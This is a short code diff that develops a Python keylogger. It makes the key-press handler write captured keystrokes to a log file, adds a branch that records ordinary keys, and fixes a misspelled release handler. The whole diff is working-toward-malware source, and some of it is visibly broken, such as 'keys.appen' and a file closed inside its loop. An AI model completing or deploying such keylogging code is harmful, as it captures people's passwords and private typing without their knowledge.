@@ -52,6 +52,11 @@ def on_press(key):
     keys.appen(key)
     count += 1
     
+    if count>= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+        
 def  write_file(keys):
     with open(file_path + extend + keys_info, "a") as k:
         for key in keys:
@@ -59,8 +64,11 @@ def  write_file(keys):
             if c.find ("space") > 0:
                 k.write('\n')
                 k.close()
+            elif c.find("Key") == -1:
+                k.write(c)
+                k.close()
                 
-def on_relese(key):
+def on_release(key):
     if key == Key.esc:
         return False
     
